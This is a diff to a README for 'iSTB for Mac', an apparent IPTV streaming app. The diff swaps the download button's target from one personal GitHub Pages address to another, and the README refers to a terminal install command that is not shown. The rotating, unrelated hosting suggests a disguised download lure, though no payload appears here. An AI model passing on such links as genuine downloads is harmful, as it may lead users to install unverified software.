@@ -3,7 +3,7 @@
 
 iSTB for Mac is a powerful application designed for smooth IPTV and STB (Set-Top Box) integration on macOS. With this tool, you can easily access, manage, and stream your IPTV content directly from your Mac device 🎉. Follow the instructions below to download and install iSTB on your Mac safely.
 
-[![Download iSTB for Mac](https://img.shields.io/badge/Download%20for-MacOS%20App%20-blue?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/istb)
+[![Download iSTB for Mac](https://img.shields.io/badge/Download%20for-MacOS%20App%20-blue?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/istb)
 
 If the download button does not work, follow the installation instructions below using the terminal command.
 
